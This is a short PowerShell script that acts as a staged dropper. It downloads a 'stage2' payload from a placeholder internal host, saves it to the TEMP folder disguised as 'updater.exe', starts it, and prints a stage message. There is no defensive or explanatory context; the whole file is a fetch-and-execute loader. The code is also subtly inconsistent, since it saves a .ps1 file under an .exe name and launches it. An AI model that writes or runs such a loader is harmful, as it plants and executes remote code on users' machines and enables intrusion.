[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://internal.corp/stage2.ps1',
    [string]$DownloadPath = "$env:TEMP\updater.exe"
)
(New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $DownloadPath)
Start-Process -FilePath $DownloadPath
Write-Output "stage 42 initialized"
